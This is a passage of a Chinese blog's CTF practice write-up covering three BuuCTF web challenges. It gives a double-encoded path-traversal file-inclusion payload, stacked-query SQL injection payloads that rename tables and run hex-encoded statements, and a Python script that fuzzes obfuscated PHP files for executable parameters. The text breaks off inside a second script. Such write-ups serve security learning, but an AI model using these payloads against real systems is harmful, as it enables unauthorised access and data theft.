<!DOCTYPE html>
<html class="has-navbar-fixed-top">
<head>
    <meta charset="utf-8">
<title>BuuCTF刷题记录 - cjM00N&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">












<link rel="icon" href="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato|Source+Code+Pro">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">


<link rel="stylesheet" href="/css/style.css">


<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>


    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=false"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'false');
</script>


    


<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/rss.xml" title="cjM00N's blog" type="application/atom+xml">
</head>
<body>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                    
                    <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png" alt="" height="28">
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">Archives</a>
            
            <a class="navbar-item "
               href="/categories">Categories</a>
            
            <a class="navbar-item "
               href="/tags">Tags</a>
            
            <a class="navbar-item "
               href="/friends">Friends</a>
            
            <a class="navbar-item "
               href="/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            <a class="navbar-item search" title="Search" href="javascript:;">
                <i class="fas fa-search"></i>
            </a>
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    <i class="fa fa-list"></i>
                </a>
                <div class="navbar-dropdown is-right">
                    
                    
                    
                    
                    <a class="navbar-item" href="#HCTF-2018-WarmUp">1&nbsp;&nbsp;<b>[HCTF 2018]WarmUp</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#强网杯-2019-随便注">2&nbsp;&nbsp;<b>[强网杯 2019]随便注</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#解题一">2.1&nbsp;&nbsp;解题一</a>
                    
                    
                    
                    <a class="navbar-item" href="#解题二">2.2&nbsp;&nbsp;解题二</a>
                    
                    
                    
                    <a class="navbar-item" href="#GetFlag">2.3&nbsp;&nbsp;GetFlag</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#强网杯-2019-高明的黑客">3&nbsp;&nbsp;<b>[强网杯 2019]高明的黑客</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#护网杯-2018-easy-tornado">4&nbsp;&nbsp;<b>[护网杯 2018]easy_tornado</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#SUCTF-2019-Pythonginx">5&nbsp;&nbsp;<b>[SUCTF 2019]Pythonginx</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#安洵杯-2019-easy-serialize-php">6&nbsp;&nbsp;<b>[安洵杯 2019]easy_serialize_php</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#ByteCTF-2019-Boring-Code">7&nbsp;&nbsp;<b>[ByteCTF 2019]Boring Code</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#上海大学生赛2019-decade">8&nbsp;&nbsp;<b>[上海大学生赛2019]decade</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#HCTF-2018-admin">9&nbsp;&nbsp;<b>[HCTF 2018]admin</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#解法一-unicode欺骗">9.1&nbsp;&nbsp;解法一 unicode欺骗</a>
                    
                    
                    
                    <a class="navbar-item" href="#解法二-Session欺骗">9.2&nbsp;&nbsp;解法二 Session欺骗</a>
                    
                    
                    
                    <a class="navbar-item" href="#解法三-条件竞争">9.3&nbsp;&nbsp;解法三 条件竞争</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World">10&nbsp;&nbsp;<b>[CISCN2019 华北赛区 Day2 Web1]Hack World</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#网鼎杯-2018-Fakebook">11&nbsp;&nbsp;<b>[网鼎杯 2018]Fakebook</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#GXYCTF2019-BabySQli">12&nbsp;&nbsp;<b>[GXYCTF2019]BabySQli</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CISCN2019-华北赛区-Day1-Web1-Dropbox">13&nbsp;&nbsp;<b>[CISCN2019 华北赛区 Day1 Web1]Dropbox</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#CISCN2019-华北赛区-Day1-Web2-ikun">14&nbsp;&nbsp;<b>[CISCN2019 华北赛区 Day1 Web2]ikun</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#BUUCTF-2018-Online-Tool">15&nbsp;&nbsp;<b>[BUUCTF 2018]Online Tool</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#BJDCTF2020-Easy-MD5">16&nbsp;&nbsp;<b>[BJDCTF2020]Easy MD5</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#BJDCTF2020-The-mystery-of-ip">17&nbsp;&nbsp;<b>[BJDCTF2020]The mystery of ip</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#极客大挑战-2019-BabySQL">18&nbsp;&nbsp;<b>[极客大挑战 2019]BabySQL</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#ASIS-2019-Unicorn-shop">19&nbsp;&nbsp;<b>[ASIS 2019]Unicorn shop</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#RoarCTF-2019-Easy-Calc">20&nbsp;&nbsp;<b>[RoarCTF 2019]Easy Calc</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" title="GitHub" href="https://github.com/cjm00n/" target="_blank" rel="noopener">
                
                <i class="fab fa-github"></i>
                
            </a>
               
            <a class="navbar-item" title="RSS" href="/rss.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
        BuuCTF刷题记录
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            
            
            <time datetime="2020-02-22T06:26:09.042Z"
                itemprop="datePublished">Feb 22 2020</time> 更新
            

            
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/CTF/">CTF</a>
        </span>
        
        
        <span id="busuanzi_container_page_pv" class="column is-narrow article-category">
            <i class="fas fa-eye" sytle="color:red;"></i>  热度: <span id="busuanzi_value_page_pv"></span> ℃
            <span class="leancloud-counter" data-leancloud-counter-url="/2020/02/14/BuuCTF刷题记录/" data-leancloud-counter-inc></span>
            <script>
var LeanCounter=function(){"use strict";function t(t){void 0===t&&(t={});var e=t.appId,n=t.appKey,r=t.elementClass;void 0===r&&(r=".leancloud-counter");var i=t.addCountInterval;void 0===i&&(i=100);var a=t.base;void 0===a&&(a="/1.1/classes/Counter");var o=t.initOnLoaded;if(void 0===o&&(o=!0),!e||!n)throw new Error("Missing appId or appKey.");this._appId=e,this._appKey=n,this._idCache={},this._addCountUrlQueue=[],this.addCountInterval=i,this.base=a,this.elements=document.querySelectorAll(r),o&&("loading"!==document.readyState?this.init():document.addEventListener("DOMContentLoaded",this.init.bind(this)))}return t.prototype._request=function(t,e,n){if(!this.apiServer)return Promise.reject(new Error("This LeanCounter instance is not initialized."));if("get"===t){var r="https://"+this.apiServer+this.base+e;if(n){var i=[];Object.keys(n).forEach(function(t){i.push(t+"="+encodeURI(n[t]))}),r+="?"+i.join("&")}return fetch(r,{headers:{"Content-Type":"application/json","X-LC-Id":this._appId,"X-LC-Key":this._appKey}}).then(function(t){return t.json()})}return fetch("https://"+this.apiServer+this.base+e,{method:t,headers:{"Content-Type":"application/json","X-LC-Id":this._appId,"X-LC-Key":this._appKey},body:JSON.stringify(n)}).then(function(t){return t.json()})},t.prototype.getCount=function(t){var e,n,r=this,i=t;return Array.isArray(i)||(i=Array(i)),e=[],n={},i.forEach(function(t){n[t]||(e.push(t),n[t]=!0)}),i=e,this._request("get","",{where:JSON.stringify({url:{$in:i}})}).then(function(t){var e=t.results,n={};return e.forEach(function(t){var e=t.url,i=t.objectId,a=t.time;r._idCache[e]||(r._idCache[e]=i),n[e]=a}),n})},t.prototype.addCount=function(t){var e=this;this._addCountUrlQueue.push(t),this._addCountIntervalId||(this._addCountIntervalId=setInterval(function(){if(0!==e._addCountUrlQueue.length){var t=e._addCountUrlQueue.pop();e._idCache[t]||e.getCount(t),e._request("put","/"+e._idCache[t],{time:{__op:"Increment",amount:1}})}},this.addCountInterval))},t.prototype.init=function(){var t=this;fetch("https://app-router.leancloud.cn/2/route?appId="+this._appId).then(function(t){return t.json()}).then(function(e){var n=e.api_server;t.apiServer=n;var r=[];return t.elements.forEach(function(t){r.push(t.dataset.leancloudCounterUrl)}),t.getCount(r)}).then(function(e){t.elements.forEach(function(n){"leancloudCounterInc"in n.dataset?(n.textContent=String(e[n.dataset.leancloudCounterUrl]+1),t.addCount(n.dataset.leancloudCounterUrl)):n.textContent=String(e[n.dataset.leancloudCounterUrl])})})},t}();

var leanCounter = new LeanCounter({
  appId: 'KnWlaUsawT6Pf6rwNLVJpt08-gzGzoHsz',
  appKey: 'HbSKKwFRuQ2jzyC1caWF8X5Y',
});
</script>
        </span>
        
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
        
        <html><head></head><body><p>感谢glzjin师傅</p>
<a id="more"></a>

<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>这是CISCN2019华南赛区半决赛的题目…当时没做出来</p>
<p>太菜了</p>
<p>题目源自 <code>CVE-2018-12613</code></p>
<p>源码如下</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">    highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span></span><br><span class="line"><span class="hljs-class">    </span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span><span class="hljs-params">(&$page)</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">            $whitelist = [<span class="hljs-string">"source"</span>=><span class="hljs-string">"source.php"</span>,<span class="hljs-string">"hint"</span>=><span class="hljs-string">"hint.php"</span>];</span><br><span class="line">            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) {</span><br><span class="line">                <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> (in_array($page, $whitelist)) {</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="hljs-number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) {</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="hljs-number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) {</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">'file'</span>])</span><br><span class="line">        && is_string($_REQUEST[<span class="hljs-string">'file'</span>])</span><br><span class="line">        && emmm::checkFile($_REQUEST[<span class="hljs-string">'file'</span>])</span><br><span class="line">    ) {</span><br><span class="line">        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">'file'</span>];</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span>;</span><br><span class="line">    }  </span><br><span class="line"><span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这里可以看到, 有<code>is_string</code>的判断, 数组绕过是不可行的, 只能绕过<code>checkFile</code>, 而<code>checkFile</code>里面有二次<code>urldecode</code>, 这给我们提供了机会, 如果我传一个</p>
<p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php%253f</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>其中<code>%253f</code>是<code>?</code>的二次编码, 这样既可绕过前面的检测, 那么接下来就是使用目录穿越了</p>
<p>先访问<code>hint.php</code>, 可以看到</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这里有个知识点是, 当二重编码时, 这里的<code>source.php</code>相当于一个目录, 也就是说我们位于</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location: /var/www/html/source.php/</span><br><span class="line">flag: /ffffllllaaaagggg</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>所以4次目录穿越, payload如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php%253f/../../../../ffffllllaaaagggg</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>或者不用判断多少直接多来几个<code>/../</code>也可以</p>
<p>最终payload</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php%253f/../../../../ffffllllaaaagggg</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><h3 id="解题一"><a href="#解题一" class="headerlink" title="解题一"></a>解题一</h3><p>fuzz之后发现过滤了<code>select</code></p>
<p>上网找找有没有能绕过select的方法, 查到了堆叠过滤, 简单测一下, 我们先输入一个复合语句</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';show tables;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190826103310.png" alt>可以看到输出正常, 说明后端的实现应该是</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_multi_query($sql);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>而平时的实现是<code>mysql_query</code>这样的语句可以支持多条sql语句同时执行, 那要绕过select的过滤的话可以使用</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @t=0x68616861686168;prepare x from @t;execute x;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>预编译语句来执行, 其中@t的部分是执行语句的hex编码, 例如我们要执行</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `1919810931114514`;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>hex编码后替换上面的<code>aaaaa</code>即可</p>
<h3 id="解题二"><a href="#解题二" class="headerlink" title="解题二"></a>解题二</h3><p>这里其实已经有了一个<code>select</code>, 那我们如果利用这个来查询的话就可以直接查询flag了</p>
<p>先查看一下两个表的结构,  表名我们前面已经查出来了</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';show columns from words;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190826121952.png" alt></p>
<p>有两个列, 一个是id另一个是data, 明显id就是查询的索引, 所以先重命名两个表</p>
<p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`words`</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">`words1`</span>;<span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">`words`</span>;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`words`</span> <span class="hljs-keyword">CHANGE</span> <span class="hljs-string">`flag`</span> <span class="hljs-string">`id`</span> <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> words;<span class="hljs-comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>可以给表增加一个id列或者直接将flag列改成id列, 然后万能密码</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1=1#</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>查出flag</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190826122349.png" alt></p>
<h3 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag"></a>GetFlag</h3><p>最终payload如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';Set @t=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;Prepare x from @t; Execute x;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190826110222.png" alt></p>
<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>强网杯的题目, 拉下来有3001个混淆过的php, 随便打开后可以看到有输出</p>
<p>回来看一下源码, 可以看到有许多get或者post的参数, 并且有<code>eval</code>, <code>system</code>, <code>assert</code>等系统函数, 但是大部分都赋值或者无法使用</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191225170919.png" alt></p>
<p>当时比赛的时候还傻乎乎的用phpstorm去一行行跟过, 这题主要考察的是fuzz的想法, 通过对这些文件进行fuzz来查找可以使用的参数, 首先需要启动php服务, 在win下我们使用phpstudy直接开就可以了, linux下直接</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0:8080</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>即可访问, 然后是通过正则去匹配传入的参数名</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(?<=_GET\[\').*(?=\'\]) # POST同理</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这里不能写成</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(?<=_(GET|POST)\[\').*(?=\'\])</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>否则会报错</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191225171322.png" alt></p>
<p>查找一下, 网上的说法是</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python lookbehinds really need to be fixed-width</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>也就是不能存在不确定宽度的内容, 所以我们需要将post和get分开, 这里有个技巧就是先收集所有的post和get参数同时发送, 如果在内容中检查到我们需要的信息, 再对当前文件的参数进行逐个fuzz, 这样可以节约很多http的开销, 单线程脚本如下</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">from</span> arrow <span class="hljs-keyword">import</span> now</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">"http://localhost/src/"</span></span><br><span class="line">work_dir = <span class="hljs-string">"C:\phpStudy\PHPTutorial\WWW\src\\"</span></span><br><span class="line">filename = os.listdir(work_dir)</span><br><span class="line">patternGet = re.compile(<span class="hljs-string">"(?<=_GET\[\').*(?=\'\])"</span>)</span><br><span class="line">patternPOST = re.compile(<span class="hljs-string">"(?<=_POST\[\').*(?=\'\])"</span>)</span><br><span class="line">print(<span class="hljs-string">"[*] start fuzzing...."</span>)</span><br><span class="line">print(now().format())</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> filename:</span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        content = open(work_dir + i, <span class="hljs-string">"r"</span>, encoding=<span class="hljs-string">"utf-8"</span>).read()</span><br><span class="line">        param1 = patternGet.findall(content)</span><br><span class="line">        paramGet = {}</span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> list(set(param1)):</span><br><span class="line">            paramGet[j] = <span class="hljs-string">"echo(cjm00n);"</span></span><br><span class="line">        param2 = patternPOST.findall(content)</span><br><span class="line">        paramPOST = {}</span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> list(set(param2)):</span><br><span class="line">            paramPOST[j] = <span class="hljs-string">"echo(cjm00n);"</span></span><br><span class="line">        <span class="hljs-comment"># print("[.] %s" % (i))</span></span><br><span class="line">        res = requests.post(url + i, params=paramGet, data=paramPOST).text</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">"cjm00n"</span> <span class="hljs-keyword">in</span> res:</span><br><span class="line">            print(<span class="hljs-string">"[*] find at %s"</span> % (i))</span><br><span class="line">            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> param1:</span><br><span class="line">                res = requests.get(url + i, params={j:paramGet[j]}).text</span><br><span class="line">                <span class="hljs-keyword">if</span> <span class="hljs-string">"cjm00n"</span> <span class="hljs-keyword">in</span> res:</span><br><span class="line">                    print(<span class="hljs-string">"[*] find %s at %s"</span> %(j, i))</span><br><span class="line">                    print(<span class="hljs-string">"[*] time: %s"</span> %(now().format()))</span><br><span class="line">                    exit(<span class="hljs-number">0</span>)</span><br><span class="line">            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> param2:</span><br><span class="line">                res = requests.post(url + i, data={j:paramPOST[j]}).text</span><br><span class="line">                <span class="hljs-keyword">if</span> <span class="hljs-string">"cjm00n"</span> <span class="hljs-keyword">in</span> res:</span><br><span class="line">                    print(<span class="hljs-string">"[*] find %s at %s"</span> %(j, i))</span><br><span class="line">                    print(<span class="hljs-string">"[*] time: %s"</span> %(now().format()))</span><br><span class="line">                    exit(<span class="hljs-number">0</span>)</span><br><span class="line">                </span><br><span class="line">    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">"[*] done"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191225171054.png" alt></p>
<p>多线程脚本如下</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 